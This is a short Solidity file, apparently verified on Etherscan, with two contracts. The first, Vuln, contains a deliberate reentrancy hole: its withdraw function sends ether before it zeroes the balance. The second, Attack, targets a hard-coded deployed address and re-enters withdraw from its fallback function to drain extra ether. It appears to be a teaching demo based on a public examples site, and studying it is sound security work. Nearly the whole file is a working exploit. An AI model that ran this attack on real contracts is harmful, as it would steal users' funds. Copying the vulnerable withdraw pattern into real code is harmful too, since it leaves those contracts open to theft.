/**
 *Submitted for verification at Etherscan.io on 2021-11-27
*/

pragma solidity >=0.5.0 <0.9.0;

// with reference to examples on https://solidity-by-example.org/

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call{value: balances[msg.sender]}("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln public vuln = Vuln(0x200dba06431bcCA84cC075Ec524d86fbAdd869d7);
    bool alreadyStolen = false;

    function attack() external payable {
        alreadyStolen = false;
        vuln.deposit{value: 0.05 ether}();
        vuln.withdraw();
    }

    function deposit() public payable {
        
    }

    fallback() external payable {
        if (!alreadyStolen) {
            alreadyStolen = true;
            vuln.withdraw();
        }
    }
}